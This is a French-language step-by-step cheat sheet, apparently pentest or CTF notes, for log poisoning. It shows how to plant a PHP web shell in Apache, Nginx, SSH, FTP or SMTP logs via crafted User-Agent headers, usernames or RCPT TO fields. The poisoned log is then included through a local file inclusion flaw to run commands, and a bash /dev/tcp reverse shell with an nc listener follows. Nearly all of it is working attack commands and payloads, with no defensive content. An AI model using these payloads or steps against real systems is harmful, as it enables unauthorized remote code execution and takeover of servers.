**Log Poisoning**

---

**Principe**

Tu injectes du code PHP dans un fichier de log, puis tu l'inclus via LFI pour l'exécuter.

```
Injection dans log → LFI inclut le log → PHP exécuté → RCE
```

---

**Étape 1 — Vérifie que le log est lisible via LFI**

```
page=/var/log/apache2/access.log
page=/var/log/nginx/access.log
page=/var/log/auth.log
page=/var/log/mail.log
```

Si tu vois le contenu du log → tu peux continuer.

---

**Étape 2 — Injecte le payload PHP dans le log**

Le log enregistre ce que tu lui envoies (User-Agent, username SSH, etc.)

```bash
# Via User-Agent (Apache/Nginx access.log)
curl -s "http://TARGET/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Via SSH (auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@TARGET

# Via SMTP (mail.log)
# username du RCPT TO contient le payload
```

---

**Étape 3 — Inclus le log via LFI + exécute**

```
page=/var/log/apache2/access.log&cmd=id
page=/var/log/auth.log&cmd=whoami
```

---

**Résultat attendu**

Le log contient maintenant :
```
127.0.0.1 - - [date] "GET / HTTP/1.1" 200 - "<?php system($_GET['cmd']); ?>"
```

Et ta LFI l'inclut → PHP l'exécute → tu as du RCE.

---

**Étape 4 — Reverse shell**

```bash
# URL encode obligatoire dans Burp
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.X/4444+0>%261'

# Listener
nc -lvnp 4444
```

---

**Pourquoi ça marche**

Le serveur web tourne avec PHP. Quand PHP **inclut** un fichier via `include()`, il **parse et exécute** tout le code PHP qu'il trouve dedans — même dans un fichier `.log`. Le log n'est pas "protégé", c'est juste un fichier texte.

**Injection dans les logs**

---

**1. Apache / Nginx — access.log via User-Agent**

C'est le plus courant. Apache log tout le User-Agent dans access.log.

```bash
# Curl
curl -s "http://TARGET/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Burp — modifie le header User-Agent dans la requête
User-Agent: <?php system($_GET['cmd']); ?>
```

Vérifie dans le log :
```
page=/var/log/apache2/access.log
```

---

**2. SSH — auth.log**

SSH log les tentatives de connexion, y compris le username.

```bash
ssh '<?php system($_GET["cmd"]); ?>'@TARGET
# Password : n'importe quoi, la connexion va échouer mais le payload est logué
```

Vérifie dans le log :
```
page=/var/log/auth.log
```

Le log contiendra :
```
Failed password for <?php system($_GET["cmd"]); ?> from ...
```

---

**3. FTP — si vsftpd actif**

```bash
ftp TARGET
# Username : <?php system($_GET['cmd']); ?>
# Password : n'importe quoi
```

Log dans `/var/log/vsftpd.log`

---

**4. SMTP — mail.log**

```bash
telnet TARGET 25
EHLO attacker.com
MAIL FROM: attacker@test.com
RCPT TO: <?php system($_GET['cmd']); ?>
```

---

**Workflow complet dans Burp**

```
1. Repeater → requête vers TARGET
2. Modifie User-Agent : <?php system($_GET['cmd']); ?>
3. Envoie la requête
4. Change l'URL : page=/var/log/apache2/access.log&cmd=id
5. Envoie → tu vois le résultat de id dans la réponse
```

---

**Problème fréquent**

Si le log est trop gros → la page met du temps ou timeout. Tu peux tenter quand même, ça marche souvent. Le payload reste dans le log même si la page est longue à charger.
